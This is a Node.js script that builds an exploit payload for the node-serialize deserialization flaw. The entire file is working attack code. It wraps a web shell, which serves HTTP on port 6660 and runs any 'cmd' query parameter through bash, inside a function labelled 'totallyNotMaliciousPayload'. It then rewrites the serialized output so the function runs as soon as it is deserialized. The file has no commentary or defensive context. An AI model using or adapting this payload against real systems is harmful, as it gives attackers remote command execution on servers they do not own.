const serialize = require('node-serialize');

const webShell = function () {
  const exec = require('child_process').exec;
  const http = require('http');
  const url = require('url');

  const port = '6660';

  const checkPortInUse = function(port, fn) {
    const tester = http.createServer()
      .once('error', function (err) {
        if (err.code != 'EADDRINUSE') {
          return fn(true);
        }

        fn(true);
      })
      .once('listening', function() {
        tester.once('close', function() { fn(false) }).close();
      })
      .listen(port);
  };

  const shell = function(res, cmd) {
    exec(
      cmd,
      {shell: '/bin/bash'},
      function (error, stdout, stderr) {
        res.end(stdout);
        if (error !== null) {
          console.log('exec error: ' + error);
        }
      });
  };

  const runWebShell = function() {
    http.createServer(function (req, res) {
      res.writeHead(200, {'Content-Type': 'text/plain'});

      const parsedRequest = url.parse(req.url, true);
      const cmd = parsedRequest.query['cmd'];

      if (cmd !== undefined) {
        console.log('[cmd] ' + cmd);
        shell(res, cmd);
      }
    }).listen(port, '0.0.0.0');
  };

  checkPortInUse(port, function(isInUse) {
    console.log('checkPortInUse');
    if (!isInUse) {
      console.log('runWebShell');
      runWebShell();
    }
  });
};

const input = { 'userName': 'foobar', 'totallyNotMaliciousPayload': webShell };

let serialized = serialize.serialize(input);
serialized = serialized.replace(/\\n|/g, '');
serialized = serialized.substring(0, serialized.length - 2) + '()' + serialized.substring(serialized.length - 2);
console.info(serialized);
